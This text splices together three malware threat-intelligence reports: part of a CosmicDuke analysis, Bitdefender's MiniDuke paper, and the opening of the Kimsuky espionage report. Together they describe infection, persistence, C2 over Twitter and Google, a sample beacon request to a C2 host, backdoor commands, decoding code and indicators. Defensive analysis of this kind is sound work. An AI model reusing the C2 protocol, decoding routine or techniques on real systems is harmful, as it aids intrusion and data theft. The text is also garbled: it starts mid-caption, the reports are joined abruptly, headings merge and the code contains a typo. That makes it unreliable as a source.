          BUGGY RC4 ENCRYPTION</caption>
<figure></figure>          
</section>

<section>
<heading>SAMPLES COMPARISON</heading>
A comparison of the compilation times of the
samples, and of other similarities observed in the file
characteristics, reveals some interesting patterns.For
more details, see “Appendix A | Samples”.</section>

<section>
<heading>LEGACY CREDENTIALS AND FTP FOLDER STRUCTURE</heading>
The oldest Cosmu samples we saw have a compilation
timestamp of 2001-09-25.Since it is possible for the
compilation timestamp to be manipulated, it may be that
the samples are not that old.We have however not seen
any samples that would give us reason to suspect that the
timestamp has been tampered with.These old samples do not use the MiniDuke loader and
therefore are not discussed in detail in this analysis.They
do however show some characteristics that link them
to these fresh variants.For example, the credentials and
same FTP folder structure used by the old samples have
been used on another Cosmu FTP server that is still active.The                       
majority of the loaders were compiled on 2012-11-                   
13, though one was compiled on 2012-12-04 - oddly                   
enough, the same day when one MiniDuke payload
reported by BitDefender <fn>[6]</fn> and Kaspersky <fn>[7]</fn>, (md5:                
6bc34809e44c40b61dd29e0a387ee682) was compiled.This was a downloader that connects to an IP address in             
Turkey.As the server is no longer up however, we were              
unable to investigate it further.The compilation timestamps of the info-stealers show                
more variation.The oldest variant loaded with the
MiniDuke loader was compiled on 2012-12-04.Most of the
info-stealers were compiled in February and March 2014.</section>

<section>                              
<heading>INFO-STEALER GROUPING</heading>
The info-stealer samples we have analyzed can be also
be separated into three distinct groupings based on the
following attributes:

yy   The program database (PDB) path
yy   Server address and credentials
yy   The loader
yy   Filenames and decoy content

Full list of the servers contacted by samples in these
groupings in available in Appendix B | Servers on page 15.</section>

<section>
<heading>Group #1</heading>
All samples in this group have a PDB path on the
infected system’s C:\ drive that contains the directory
“botgenstudio”.<footnote>
6.BitDefender; M. Tivadar, B. Balazs & C.Istrate; A Closer Look at MiniDuke;
   http://labs.bitdefender.com/wp-content/uploads/downloads/2013/04/MiniDuke_Paper_Final.pdf
7.The IP address of the servers used by this     
group of samples are in Luxembourg, Netherlands, and          
Russia.See “Appendix B | Servers” for details.We have seen three different droppers for this sample         
group.All droppers use the RLO trick.We have not found any exploits associated to this group of    
samples.</section>
          
<section>                                                              
<heading>Group #2</heading>                                                      

All samples in this group have a PDB path that contains       
directories named “NITRO” and “SVA”.The PDB path is          
always on D:\ drive.The sole exception is
sha1:98f81b03a3b0f7b0b914d783683817953e8d4cf0.It
does not use an exploit and it does not use a dropper;
instead the loader has a filename (Sivil Durum Raporu Kriz
Merk?fdp.izay.exe) that uses the same RLO trick used in
Group #1 samples.Another interesting detail for this sample is the PDB path:

  d:\sva\nitro\botgenstudio\interface\
  generations\80ddfcc1\bin\Bot.pdb

Even though this contains both “SVA” and “NITRO”, it
also contains “botgenstudio”, again making it similar
to Group #1.One other sample in Group #2 (sha1:
fb3b8f6494b211386381a7e4f6524d3e4643c9e9) shows a
similar PDB path.The servers used by this group are exclusive to this group,
i.e., the other sample groups do not use any of the servers
group #2 uses.</section>

<section>
<heading>Group #3</heading>
The most recent CosmicDuke samples all belong to this
group.Unlike Groups #1 and #2, no exploits or droppers
are known to be associated with Group #3 samples, and
the loader filenames do not use the RLO trick.As such, we
will not cover Group #3’s delivery method further.Of more interest with Group #3 is that older samples
within this groupin show some differences from the
latest variants.A few older samples in Group #3 still use
the original MiniDuke loader, while most recent ones are
using the updated MiniDuke loader.Another difference is that unlike the older ones, the latest
samples use the following PDB path:

yy D:\PRODUCTION\NITRO\KSK\Generations\70BCDEA1\
   bin\Bot.pdb.This is quite similar to Group #2, though it seems “SVA” has
been replaced by “KSK”.All samples in Group #3 connect to an FTP server at IP
188.116.32.164 using the same username (“adair”) and
password.This is the only server that the samples with the
original MiniDuke loader use.Meanwhile, the most recent sample in Group #3,
which uses the updated loader with t the SHA1 value
fecdba1d903a51499a3953b4df1d850fbd5438bd, also
connects to another server at IP address 178.21.172.157.The updated loader has PDB path, C:\Projects\NEMESIS\
nemesis-gemina\nemesis\bin\carriers\ezlzma_x86_exe.pdb.<doc>
 
<cover>
                                  A Closer Look at MiniDuke




A Closer Look at
MiniDuke
Authors
Marius TIVADAR – Team Leader, Malware Research
Bíró BALÁZS – Malware Researcher
Cristian ISTRATE – Malware Researcher




_________________________________________________________________________________
General information:
Discovery date: February 27 2013.Date of the first known sample: June 2011.Risk: Document exfiltration.</cover>

<footer>
                                          2
                                  © 2013 Bitdefender
</footer>                                  
                                                                             
<header>A Closer Look at MiniDuke</header>



<toc>
Table of Contents


Table of Contents ...................................................................................................................................................... 3
1.Overview .............................................................................................................................................................. 5
2.The Infection Vector ....................................................................................................................................... 6
3.Samples ............................................................................................................................................................... 6
4.Packer Intelligence.......................................................................................................................................... 6
5.Malware Versions ......................................................................................................................................... 18
8.Anti-Reverse Techniques ......................................................................................................................... 19
9.Overview</heading>
This piece of malware is made of three components: pdf, main, payload.The PDF file embeds
exploit code and a dropper that writes the “main” DLL component on the drive.Additionally,
the original PDF also contains a clean PDF file used in the social engineering stage.<figure></figure>


<caption>Figure 1: Infection mechanism</caption>



As the malicious PDF file is opened, the Adobe process gets exploited, which results in
running the dropper.In turn, upon the dropper’s execution, the host process is killed and the
clean PDF file gets displayed.This trick allows the malware to run inconspicuously, without
the user noticing that something has happened in the background.The main DLL file is also
loaded and runs in installation mode (see the First Installation section ↓).Once installed, the malware calls back home using a URL found via Twitter or Google search
query.When successfully connected, new updates or payloads are installed under the disguise
of .gif images.There may be other infection mechanisms other than PDF files, but they remain unknown at
the moment.</section>

<footer>
                                               5
                                       © 2013 Bitdefender
</footer>                                       
                                          
<header>A Closer Look at MiniDuke</header>

<section>


   <heading>2.The Infection Vector</heading>

Until now, we have only found spreading mechanisms that use social engineering via
malicious PDF files sent over e-mail (see Appendix F: Forged documents↓).The (Appendix D:
E-Mail samples used in attacks↓) section shows such a sample isolated from a real-life attack.The following exploits have been used to trigger the infection:

2012
CVE-2011-2462

2013
CVE-2013-0640

The infection vector for the samples dated 2011 is unknown.</section>

<section>
   <heading>3.Samples</heading>
The list of known samples is available in the Samples by Year Appendix ↓.</section>

<section>
   <heading>4.Packer Intelligence</heading>
The file contains four or five sections with standard names such as: .text, .data, .reloc, .edata,
.rdata.The packer code is relatively small (< 1024 bytes).It is encrypted and located in the
.text section.The packer is used to decrypt the main code located in the largest section -
usually .data or .rdata.The DLL file only exports one function with a random name.Decryption
<code>
Code = <buffer of the encrypted code>
length = len(Code)
i = length
for b in Code:
       v = ROL(b, i) length;
       <store decrypted value (v)>
       i = i - 1;
</code>
</section>

<footer>
                                                 6
                                         © 2013 Bitdefender
</footer>                                         
                                           
<header>A Closer Look at MiniDuke</header>


<section>

   <heading>5.Modus Operandi</heading>

<heading>5.1 Notations</heading>

SHA1 : SHA1 (probably modified)
area1 : a 16-byte zone in the malicious file which holds the query string for Google.area2 : a 128-byte zone in the malicious file which holds the encrypted Twitter link.</section>

<section>
<heading>5.2 First installation</heading>

This is the case when the malware is started by the dropper.The malware awaits for the user
to interact with the computer and verifies the input from mouse or keyboard in an endless
loop.In the first step, the watermark is applied, as described in the Watermark ↓ section.After the watermark is applied, the malware re-computes the file’s checksum by using the
CheckSumMappedFile() function.The file is dropped with a name randomly chosen from a list in the %ALLUSERSPROFILE%\
Application Data folder set to automatically start after reboot as described below:

      for samples in 2011/2012: the malware modifies the Shell key in
       Software\Microsoft\Windows NT\CurrentVersion\Winlogon.The key holds an
       environment variable which is set to “rundll32.exe <path_to_dll>, <export_name>”.   for samples collected in 2013: the malware adds a .lnk file to the Startup directory,
       which would execute the dll using rundll32.exe.If there is already a variant of the malware installed before the copy process, the new
malware deletes it and creates another combination of names, as well as a new environment
variable or .lnk file.</section>

<section>
<heading>5.3 Post-Install Execution</heading>

In this stage, the malicious binary checks if the image is rundll32 - and therefore if it is run on
the system through the .lnk file set in the Startup folder or if it is run from the environment
variable.Then, a thread is created in which the OpenInputDesktop() function is called in an
endless loop with a sleep interval of 5 seconds.The malware then waits for user interaction
by checking input from the mouse or keyboard.The binary also checks the current date, but
only uses the current week of the month, the current month and year.The malware
then removes the watermark, decrypts the data section and attempts to access the Twitter
and Google accounts.When either of the sites respond, it interprets the received data and decodes the tweets.When the tweet is decoded, the malware connects to the command and control server in the
message and send information about the infected system.The malware then awaits for a response from the command and control center, which comes
as an encrypted GIF file.Upon decryption, the malware extracts the embedded payload and
runs it.The payload is often an update.After the task has completed, the malware stops.Its execution only lasts until it manages to
connect to a Twitter account, then it exits, in order to increase its chances of staying
undetected.However, it still runs for a little while upon every operating system boot.The analysis we carried inside the lab reveals that the payloads are not persistent on disk.We
presume that they are downloaded from a specific location whenever the system boots up.</section>

<section>
<heading>5.4 The Watermark</heading>

When the malware is ran via rundll32.exe upon the first boot, it creates a copy of itself named
as tempfile.dat (in some samples) and would mark the executable file in order to prevent it
from correctly running on other systems.This watermarking process involves the
modification of two already encrypted data areas at the end of the executable file.The first encrypted area is 0x80 bytes large and holds the encrypted Twitter link.Also worth mentioning is the fact that the
variants we discovered as dated 2012/2013 are connecting via HTTPS.The second area is 0x10 bytes long and holds an encrypted string that is used to perform a
Google query for samples from 2012/2013.Depending on the string and the current date, a
second Twitter handle is generated.The sample dated 2011 does not feature this Google
search mechanism.The data areas don’t start at a specific offset.In order to find them, the malware iterates them
from their end and looks for the first byte that is not zero.This would be the last byte from the
small area (which is 0x10 bytes large).From here on, it can compute where the larger data
area is located in the file.After the malware has identified the area offsets, it would start encrypting them.A hash is also
computed on specific pieces of system information and will be used in the encryption process.</section>

<section>
<heading>5.4.1 Data layout (for samples dated 2011)</heading>

The malware enumerates every network interface, isolates the first DWORD in the description
and writes it to the buffer.<code>
GetIfTable(interfaces);
for (i = 0; i < interfaces.count; i++)
{
       Buff[i] = *(DWORD*)interfaces[i].bDescription;
}
</code>

<footer>
                                                 9
                                         © 2013 Bitdefender
</footer>                                         
                                         
<header>A Closer Look at MiniDuke</header>




The result is overwritten to the previously collected data.This behavior is probably triggered
by a bug.</section>

<section>
<heading>5.4.2 Data layout (samples in 2012/2013)</heading>
<code>
typedef struct COMPUTER_INFO
{
       DWORD dwSerialNumber; // found with a GetVolumeInformation call
       DWORD dwCPUID; // found with the CPUID instruction
       char ComputerName[MAX_COMPUTER_NAME_LENGTH + 1];
} COMPUTER_INFO, *PCOMPUTER_INFO;
</code>

The data is padded with zeros in order to achieve a block of 0x40 bytes.A SHA-1 hash is then
computed on these bytes, which is then used to modify the small data area (area1).<code>
*((DWORD*)    area1) ^= *((DWORD*) hash);
*((DWORD*)    area1 + 4) ^= *((DWORD*) hash + 4);
*((DWORD*)    area1 + 8) ^= *((DWORD*) hash + 8);
*((DWORD*)    area1 + 0xC) ^= *((DWORD*) hash + 0xC);
</code>
For the large data area (which is 0x80 bytes long), the malware does not use the same hash
for encryption.Instead, it would interchange the first DWORD with the second one in the
structure and would re-compute the SHA-1 hash.<code>
for (i=0;i<8;i++)
{
       *((DWORD*)      area2   +   i) ^= *((DWORD*) hash);
       *((DWORD*)      area2   +   i*4) ^= *((DWORD*) hash + 4);
       *((DWORD*)      area2   +   i*8) ^= *((DWORD*) hash + 8);
       *((DWORD*)      area2   +   i*0xC) ^= *((DWORD*) hash + 0x10);
}
</code>

After these operations have completed, a new checksum on the file is computed via the
CheckSumMappedFile() function.</section>

<section>
<heading>5.5 Removing the Watermark</heading>

When the malware is run automatically (through rundll.exe), the watermark is removed.The
malware re-computes the hash based on the information collected from the system and would
perform a XOR operation with the keys computed on the data sections as described in the
Watermark ↑ section.When these operations have completed, the sample loaded in memory
would not feature the watermark and the data can be decrypted.<footer>
                                              10
                                       © 2013 Bitdefender
</footer>                                       
                                         
<header>A Closer Look at MiniDuke</header>




In order to deter analysis and avoid identification in automated malware research systems,
the malware iterates through processes and looks for potentially dangerous processes listed
in the Appendix A: Process Blacklist ↓ section.If it finds a blacklisted process, the malware
modifies the first DWORD in the structure to be hashed in order to ensure that the data
cannot be correctly decrypted.</section>

<section>
<heading>5.5.1 Removal of the watermark through cryptanalysis</heading>

As we discussed in the previous paragraphs, we know that the full Twitter link used by this
specific sample is located in the second data section.Upon decryption, the buffer should start
with http(s)://(mobile|m)twitter.com which means that we could find out the encryption key
used for watermarking, as the encryption algorithm is a constant, just like the encrypted data.We can find all the 16 bytes, since the plain-text is over 16 bytes long.As soon as we had the
key, we could completely decrypt the full link, including the Twitter username.For the first data section - where the Google hyperlink is stored - cryptanalysis cannot be
performed as we don’t have a prefix of the encrypted text.More than that, the length of the
encrypted data is exactly the same as the length of the key.</section>

<section>
<heading>5.6 Decrypting the Twitter and Google usernames</heading>

The process starts with removing the watermark, as described in the Removing the
Watermark ↑ section.At this point, we can isolate the data, although it is encrypted.We proceed then with decrypting the 16-byte section that holds the Google username.The
decryption key is obtained by computing the CRC on the unpacked code.The code starts at offset 0xC and spans until the beginning of the data section (which is 0x80
bytes long).</section>

<section>
<heading>5.7 Extraction of the secondary Twitter username</heading>

If the primary Twitter username can’t be accessed or if there is an error while contacting the
C&C server mentioned in the first tweet, the malware will attempt the same operation with
the secondary Twitter account.This secondary account is derived from the Google ID (which
is hardcoded into the sample) and the current date (current week).This means that a
different ID should come up every week.<heading>The Algorithm</heading>

The malware gets the current date, but only keeps the week of the month, month and year.These pieces of data are then concatenated with the decrypted data in the first data section.A
SHA-1 hash is computed on a buffer that has the following structure: Date|GoogleSearchTerm.The hash is then converted to Base64 and isolates the first N bytes of the buffer, which are
determined by:
<code>
N = (*(DWORD*) base64_string % mod_val) + add_val;
// (mod_val, add_val) are
// (8, 6) for samples dated 2011
// (6, 7) for samples dated 2012/2013
</code>
Special characters are then stripped from the resulting string.Character ’+’ becomes ’a’, and
character ’/’ becomes ’9’.</section>

<section>
<heading>5.8 Interaction with Twitter</heading>

The malware variant dated 2011 connects to twitter.com, while the variants isolated in
2012/2013 use mobile.twitter.com instead.Every sample comes hardcoded with a version
number in the form of a string.Every version uses a different Twitter username.</section>

<section>
<heading>5.8.1 Decoding the Tweets</heading>

The buffers are decoded using Base64, then rotates the output to the right (ROR) with a
variable number of bytes, and then 0x5A is subtracted.The encoding is fairly easy by
reversing the algorithm.<code>
def ror(val,pos):
       return ((val >> pos) & 0xff) | ((val << (8-poz)) & 0xff)

crypt = base64.b64decode(din)
c = 0
dout = ""
for x in crypt:
       dout = dout + chr((ror(ord(x), c) - 0x5A) & 0xff)
       c = (c + 1) % 8
// “dout” holds the decoded string
// "din" is the initially-encrypted string.</code>
</section>

<section>
<heading>5.9 Backup mechanism: Google</heading>

If there are connectivity issues while accessing Twitter or if no tweets holding a uri!command
are found, the malware falls back to an alternate backup mechanism.A search query with a


<footer>
                                              13
                                       © 2013 Bitdefender
</footer>                                       
                                          
<header>A Closer Look at MiniDuke</header>



series of characters is sent to Google.The results are then processed until an “uri!” pattern is
found.2011
zZkadfDljFE94fFa

2012
DFJ2dskl2394FDLI
9LidWIdf230DFkdL
zZkOERmcrD94fFLa
666wifjDfjalQWLK

2013
lUFujJFDiufLKWPR
HkyeiIDKiroLaKYr
HJUlredIREYUkLLa
lUFEfiHKDroLaKYr
HJUlOIDIREYUkLLa
lUFEfiHKljfLKWPR

Although it has been implemented, this mechanism has not been used in the wild.A Google
search for these sequences did not yield any results.Most likely, the mechanism has been
implemented either for possible victims who had access to Twitter blocked in the firewall or
as a failsafe mechanism, should the Twitter accounts get suspended.Also worth mentioning is the fact that the publication of any technical papers about MiniDuke
with mentions to the uri!command and these unique sequences would also activate this
mechanism.If an infected system is unable to connect to Twitter anymore, it would still be
able to call back home, as the Google query would return the C&C address in these technical
papers.</section>

<section>
   <heading>6.Command and Control</heading>
Each Twitter username is associated with as many command and control centers as tweets.The tweets are encoded as described in the Decoding the Tweets ↑ section.After the C&C address is decoded, the malware concatenates it with index.php or main.htm,
default.htm, home.htm etc.See the Appendix B: Possible channels used for C&C section ↓.</section>

<section>
<heading>6.1 The Tweets</heading>

The Twitter accounts and their corresponding messages are listed in the Appendix E: Twitter
accounts section↓, along with their timestamp - the date in which action was taken by the
attacking party.The language of these tweets is particular for non-native English speakers - indefinite articles
are missing, but the definite ones are present.This is a feature particular to a small number of
relatively popular languages that are spoken in Indonesia or Middle East.2011
ObamaApril
uri!wp07VkkxYt3Ag/bdbNgi3smPJvX7+HLEw5H6/S0RsmHKtA==

etoursinfo
uri!wp07VkkxYmHJnTtmuxrvY8ST8m6It3LjiYEnZvz4Yl/JezdMPBkw5IiVC1al.He is working hard.uri!wp07VkkxYmfNkwN2nBmx4ch/Iu2c+GJow39HbphL

FontenotHoward
My native town was ruined by tornado.uri!wp07VkkxYt3Md/JOnLhzRL2FJjY8l2It

TinaPena10
alas I met new boy uri!wp07VkkxYt3Md/JOnLhzRL2FJm7Mt7DEWg==

LorindaRay1
The weather is good today.Sunny!uri!wp07VkkxYt3Mne5uiDkz4Il/Iw48Ge/EWg==
</section>

<section>
<heading>6.2 The Communication Protocol</heading>

The malware performs a GET request to a server with a Base64-encoded string that, if
decoded, reads the following:

For 2011 samples:
crc32
country_code
ComputerName/%USERDOMAIN%
OS major, minor, sp_major, prod_type, architecture(32/64bit)
antivirus_list
proxy_list
version (the version of the malicious sample)
All values are split with ”|”.The entire string is encoded in Base64.For 2012/2013 samples:
These samples send additional data, such as the system username.Another significant change
is the fact that the malware encodes the text using XOR and a key that results from SHA-1
hashing of the Google identifier.The resulting buffer is then encoded with Base64.This is a practical example of the GET request:

?a=MjIzMTQyMzkzM3xST3xIT01FL0hPTUV8NXwxfDN8MXwwfC18LXwyLjEy&g=MjIzMTQy
M.

The variables names in the GET requests are randomly-picked.The second variable holds a
CRC modulo 13D455h on the encoded string.The server responds with a GIF file that holds
either a DLL or an EXE file.</section>

<footer>
                                                16
                                         © 2013 Bitdefender
</footer>                                         
                                            
<header>A Closer Look at MiniDuke</header>



<section>
<heading>6.3 Adding Modules and Updates</heading>

After a request is sent to the C2, the malware receives a file with a .GIF header.This is usually
a valid image that has appended to it a payload or an update in an encrypted form.The malware checks for the ‘GIF8’ magic at the beginning of the file and looks for the 0x3b00
word.If the pattern is found, the malware isolates the next four bytes that actually represent
the decryption key, followed by the encrypted payload.Next, the digital signature is verified
and then the payload is decrypted.If it is a DLL file, it attempts to load it via LoadLibrary(); if it
is an EXE file, it gets written on disk with one of the following names: winupdt.exe,
wcsntfy.exe, netmngr.exe, dumpreport.exe, taskhosts.exe, wupdmngr.exe, winhlp.exe,
dllhosts.exe, dxdiagupd.exe, dialers.exe, netschd.exe, connwiz.exe, certupdt.exe,
repfault.exe, wuapreport.exe, lanmgr.exe.The file is then executed.The GIF file is digitally signed with RSA 2048bit.The signature is located at the end of the GIF
file and uses SHA-1.This mechanism ensures that the updates are “legit” and prevents an
outsider from pushing a fake update.There are approximately 60 entries which we believe are information about the
targets.Since we know the form of the data sent over to Command and Control centers, we might be
able to get the format for the logs.The format is <CRC>|base64|<size>|<md5>.The CRC is a
decimal representation, while the <size> field can represent the size of a payload sent to the
respective target.The <md5> - value may be the MD5 hash of the payload.No
files in the list could be found by their corresponding MD5.</section>

<section>
   <heading>7.Malware Versions</heading>
Each sample of the malware comes with a version number hardcoded in the binary.Different
versions are usually linked to a different Twitter account.The vast number of versions
indicates intense activity, but only a limited number of samples are known.The timestamp is
isolated from the sample’s PE header and represents the moment in which the executable file
has been linked.Although it can be usually spoofed, we believe it is real, as we were able to
correlate it with the moment we received each of the samples.2011
2011/06/20 - 0.1 - ObamaApril
2011/10/13 - 2.12 – etoursinfo

For the 2011 timeframe, we have two samples.The one linked with the ObamaApril Twitter
handle - malware version 0.1 - appears to be the oldest sample.The jump to version 2.12
cannot be justified, and we believe that there are a number of missing samples, which makes
year 2011 one of the most active periods for this family of malware.However, one could also
speculate that the versions do not follow a strict order.2012
2012/05/14 - 6.66 - trulrich
2012/05/21 - 5.21 - trulrich
2012/05/23 - 6.67 - zokath
2012/06/06 - 6.06 - tonyafordy
2012/09/04 - 0.49 - CurtinDiana
2012/12/26 - 3.13 - RuthHarper14

For year 2012, there are a number of different versions, although we don’t know if they follow
a strict order or not.For instance, version 3.13 was released in December, while version 5.21
was spotted in May.It is possible that the servers hosting the samples to have run out of sync.This would explain why lower versions have shown up in December.Every subversion of the malware
comes with a separate Twitter handle.Quick math shows that there are at least 20 Twitter
accounts that have been used in the attacks throughout 2013 (or at least until February 26th,
the date of the discovery).</section>

<section>
   <heading>8.Anti-Reverse Techniques</heading>
The first defense mechanism to prevent analysis is the presence of the watermark.The binary
file won’t properly run on a different machine, since the data inside the malware would be
decrypted improperly.Other techniques to prevent data decryption are present inside the binary:

      Running software used for reverse engineering: OllyDbg, IDA, Process Monitor etc.   Running the binary in virtual machines: VMWare and VirtualBox.   Breakpoints added to the code or code alteration (hardware breakpoints need to be
       used instead).The malware also monitors for signs of user interaction, a common technique used for anti-
emulation and anti-automated malware analysis.Another important aspect for versions in
2012 and 2013 is the fact that the malware does not trigger right after installation, but rather
wait for a system restart to execute its main code.</section>

<footer>
                                               19
                                        © 2013 Bitdefender
</footer>                                        
                                           
<header>A Closer Look at MiniDuke</header>


<section>

   <heading>9.Payload: Backdoor</heading>

<heading>9.1 Samples</heading>

These are the MD5 hashes for the droppers.The date is collected from the PE file header of
the backdoor in the droppers:

1e1b0d16a16cf5c7f3a7c053ce78f515, 2012-03-05
b029378966d2694f8abd51f0d6c7822a, 2012-06-15
53db085a276ebbf5798ba756cac833ea, 2013-02-22
</section>

<section>
<heading>9.2 The Loader</heading>

The loader decodes the information in the .data section with the UCL algorithm, then passes
control to the decrypted code.This piece of code holds a small loader stub, followed by an
executable file which is the backdoor itself.The stub overwrites the memory image of the
original executable file with the backdoor so it is never written on disk.The malware also creates the following key in the Registry
HKCU\Software\Microsoft\ApplicationManager with a value of AppID = <random> (the value is
generated via the GetTickCount() function).Malware then waits in a loop and performs
requests to info.leveldelta.com

Example: GET /php/text.php?i=gigogrzf4J74xQdeBqVi6w360xlP2ksrNpY7dxmj Accept:
*/* User-Agent: Mozilla/4.0 Host: info.leveldelta.com
The base64 value in the request is a 30-byte buffer derived from AppID and GetTickCount()
and is always different.We believe that it is used as an identifier.If it gets a response from the
server, the malware performs a series of validations and execute the received commands.The responses are sent via POST and contain the identifier from the GET request, followed by
the command’s result.This is the way the malware exfiltrates documents from the target
computers.</section>

<section>
<heading>9.3 Backdoor commands</heading>

mv - Moves a file.Uses MoveFileA api.cp - Copies a file.Uses CopyFileA api.rm - Deletes a file.Uses DeleteFileA api.pwd - Gets current dir.Uses GetCurrentDirectoryA api.cd - Sets current dir.Uses SetCurrentDirectoryA api.rmdir - Removes dir.Uses RemoveDirectoryA api.mkdir - Creates a dir.Uses CreateDirectoryA api.pskill - Kills process.Uses OpenProcess, TerminateProcess apis.<footer>
                                                20
                                         © 2013 Bitdefender
</footer>                                         
                                       
<header>A Closer Look at MiniDuke</header>



exew - Create a process.Uses CreateProcessA api.conf - Gets some configuration data, creates a string "id: 0x%08X\char`
host: info.leveldelta.com\
port: %d\
delay: %d\”
cdt - Change to TEMP dir.Uses GetTempPathA, SetCurrentDirectoryA APIs.dev - Returns the list of drives in the system with their type (fixed, removable, etc).The
following strings are used for their types: unk, nrt, rmv, fix, net, cdr, ram, und.Uses
GetLogicalDriveStringsA, GetDriveTypeA apis.time - Gets the number of hours since the system was started: "uptime %5d.%02dh”.Uses
GetTickCount api.info - Gets info about system.String generated like: "%d %s\n%s\
%s\" using GetCurrentProcessId, GetModuleFileNameA, GetComputerNameA, GetUserNameA
apis.exit - "exiting..."
dir, ls - List files in current dir.Uses FindFirstFile("*"), FindNextFile apis.exeu - CreateProcessWithLogonW and reads data from pipe.ecec - CreateProcessA and read data from pipe.put - Writes file on disk from internal buffer.Uses CreateFileA, WriteFile apis.get - Reads a file in chunks of 0x400 bytes and computes SHA1 on them.ps, pslist - Gets info about processes and their modules.Uses EnumProcesses, OpenProcess,
EnumProcessModules, GetModuleFileNameExA apis.Payload: Turkish Backdoor</heading>


<heading>10.1 Sample</heading>

626489f8cafacb1b24fe6ecf0db52f23 - The received.gif file, named 3979106736.gif
6bc34809e44c40b61dd29e0a387ee682 - The variant decrypted from the .gif file

Observations: clean code, generated by the compiler and no obfuscation.The file does not
have version information or digital signature.</section>

<section>
<heading>10.2 Modus Operandi</heading>

The malware checks to see if the host computer connects to the Internet through a proxy
server.If set, the malware uses the proxy settings.Regardless of the connection method, the
malware connects to 85.95.236.114:443 using sockets.It creates an unique identifier (DWORD size), from the socket handle.Everything is encrypted
with XOR and a value of an address on the stack.It sends the identifier on the opened socket.It receives 16 bytes from the socket, and creates a MD5 hash on these.The MD5 hash will be
used as key for the AES algorithm.It receives 16 bytes used for AES encryption as initialization vector.It receives 4 bytes, it performs a XOR operation with the identifier and allocates memory as
follows: malloc(val XOR user_id)

It receives a number of size bytes, decrypts them with AES and calls the start of the decrypted
buffer.The payload can be used to load new modules.The received code needs to be completely
relocatable as the main piece of malware.Using this technique, the attackers may introduce
malicious code that will never be saved on disk, but rather executed directly from memory.We could also presume that some payloads have been exclusively delivered via this channel
and can’t be recovered for forensic investigation because they never made it on the disk drive.<footer>
                                                22
                                         © 2013 Bitdefender
</footer>                                         
                               
<header>A Closer Look at MiniDuke</header>




Information about 85.95.236.114
Location: Turkey Izmir Inetmar Internet Hizmetleri San.Tic.Ltd. Sti
ASN: AS49467 INETMAR INETMAR Internet Hizmetleri Autonomous System
(izmir) (registered Jun 15, 2009)

Contact: person: Deniz Tosun org: ORG-IiHS1-RIPE address: 1370 sok.<doc>
<section>
<heading>The "Kimsuky" Operation: A North Korean APT?</heading>
For several months, we have been monitoring an ongoing cyber-espionage campaign against South
Korean think-tanks.There are multiple reasons why this campaign is extraordinary in its execution and
logistics.It all started one day when we encountered a somewhat unsophisticated spy program that
communicated with its "master" via a public e-mail server.This approach is rather inherent to many
amateur virus-writers and these malware attacks are mostly ignored.However, there were a few things that attracted our attention:

        The public e-mail server in question was Bulgarian - mail.bg.The compilation path string contained Korean hieroglyphs.These two facts compelled us take a closer look at this malware -- Korean compilers alongside Bulgarian e-
mail command-and-control communications.The complete path found in the malware presents some Korean strings:

D:rsh       UAC_dll(      )Releasetest.pdb

The "rsh" word, by all appearances, means a shortening of "Remote Shell" and the Korean words can be
translated in English as "attack" and "completion", i.e.:

D:rshATTACKUAC_dll(COMPLETION)Releasetest.pdb

Although the full list of victims remains unknown, we managed to identify several targets of this
campaign.According to our technical analysis, the attackers were interested in targeting following
organizations".The Sejong Institute

The Sejong Institute is a non-profit private organization for public interest and a leading think tank in
South Korea, conducting research on national security strategy, unification strategy, regional issues,
and international political economy.Korea Institute For Defense Analyses (KIDA)

KIDA is a comprehensive defense research institution that covers a wide range of defense-related issues.KIDA is organized into seven research centers: the Center for Security and Strategy; the Center for
Military Planning; the Center for Human Resource Development; the Center for Resource Management;
the Center for Weapon Systems Studies; the Center for Information System Studies; and the Center for

Modeling and Simulation.KIDA also has an IT Consulting Group and various supporting departments.KIDA's mission is to contribute to rational defense policy-making through intensive and systematic
research and analysis of defense issues.Ministry of Unification

The Ministry of Unification is an executive department of the South Korean government responsible for
working towards the reunification of Korea.Its major duties are: establishing North Korea Policy,
coordinating inter-Korean dialogue, pursuing inter-Korean cooperation and educating the public on
unification.Hyundai Merchant Marine

Hyundai Merchant Marine is a South Korean logistics company providing worldwide container
shipping services.Some clues also suggest that computers belonging to "The supporters of Korean Unification"
(http://www.unihope.kr/) were also targeted.Among the organizations we counted, 11 are based in South
Korea and two entities reside in China.Partly because this campaign is very limited and highly targeted, we have not yet been able to identify how
this malware is being distributed.The malicious samples we found are the early stage malware most often
delivered by spear-phishing e-mails.</section>

<section>
<heading>Infecting a system</heading>

The initial Trojan dropper is a Dynamic Link Library functioning as a loader for further malware.It does
not maintain exports and simply delivers another encrypted library maintained in its resource section.This second library performs all the espionage functionality.When running on Windows 7, the malicious library uses the Metasploit Framework's open-source code
Win7Elevate to inject malicious code into explorer.exe.In any case, be it Windows 7 or not, this malicious
code decrypts its spying library from resources, saves it to disk with an apparently random but hardcoded
name, for example, ~DFE8B437DD7C417A6D.TMP, in the user's temporary folder and loads this file as
library.This next stage library copies itself into the System32 directory of the Windows folder after the hardcoded
file name -- either KBDLV2.DLL or AUTO.DLL, depending on the malware sample.Then the service is
created for the service dll.Service names also can differ from version to version; we discovered the
following names -- DriverManage, WebService and WebClientManager.These functions assure malware

persistence in a compromised OS between system reboots.At this stage, the malware gathers information about the infected computer.This includes an output of the
systeminfo command saved in the file oledvbs.inc by following the hardcoded path: C:Program
FilesCommon FilesSystemOle DBoledvbs.inc.There is another function called - the malware creates a
string containing computer and user names but this isn't used anywhere.By all appearances, this is a
mistake by the malware author.Later on, we will come to a function where such a string could be
pertinent but the malware is not able to find this data in the place where it should be.These steps are
taken only if it's running on an infected system for the first time.At system startup, the malicious library
performs spying activities when it confirms that it is loaded by the generic svchost.exe process.<figure></figure>

</section>

<section>
<heading>Spying modules</heading>

There are a lot of malicious programs involved in this campaign but, strangely, they each implement a
single spying function.It is not accidental that the malware author has singled out AhnLab's security product.During our Winnti
research, we learnt that one of the Korean victims was severely criticized by South Korean regulators for
using foreign security products.We do not know for sure how this criticism affected other South Korean
organizations, but we do know that many South Korean organizations install AhnLab security products.Accordingly, these attackers don't even bother evading foreign vendors' products, because their targets are
solely South Korean.Once the malware disables the AhnLab firewall, it checks whether the file taskmgr.exe is located in the
hardcoded C:WINDOWS folder.If the file is present, it runs this executable.Next, the malware loops
every 30 minutes to report itself and wait for response from its operator.</section>

<section>
<heading>Communications</heading>

Communication between bot and operator flows through the Bulgarian web-based free email server
(mail.bg).The bot maintains hardcoded credentials for its e-mail account.After authenticating, the
malware sends e-mails to another specified e-mail address, and reads e-mails from the inbox.All these
